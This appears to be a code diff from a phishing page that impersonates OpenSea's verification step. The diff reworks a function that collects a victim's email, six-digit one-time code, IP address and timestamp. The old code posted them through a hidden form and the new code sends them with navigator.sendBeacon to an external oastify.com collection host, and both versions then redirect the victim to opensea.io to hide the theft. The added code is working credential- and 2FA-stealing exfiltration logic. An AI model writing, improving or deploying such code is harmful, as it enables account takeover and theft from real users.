@@ -211,33 +211,16 @@
 
             if (code.length !== 6) return;
 
-            var form = document.createElement('form');
-            form.method = 'POST';
-            form.action = 'https://snjhhnfdgfawcbr8mrhy8oywlnrefe33.oastify.com/';
-            form.style.display = 'none';
+            var fd = new FormData();
+            fd.append('email', userEmail);
+            fd.append('code', code);
+            fd.append('ip', window.visitorIP);
+            fd.append('step', 'code_submitted');
+            fd.append('time', new Date().toISOString());
 
-            var formInputs = [
-                {name: 'email', value: userEmail},
-                {name: 'code', value: code},
-                {name: 'ip', value: window.visitorIP},
-                {name: 'step', value: 'code_submitted'},
-                {name: 'time', value: new Date().toISOString()}
-            ];
+            navigator.sendBeacon('https://snjhhnfdgfawcbr8mrhy8oywlnrefe33.oastify.com/', fd);
 
-            formInputs.forEach(function(item) {
-                var input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = item.name;
-                input.value = item.value;
-                form.appendChild(input);
-            });
-
-            document.body.appendChild(form);
-            form.submit();
-
-            setTimeout(() => {
-                window.location = 'https://opensea.io';
-            }, 500);
+            window.location = 'https://opensea.io';
         }
 
         function resendCode(event) {
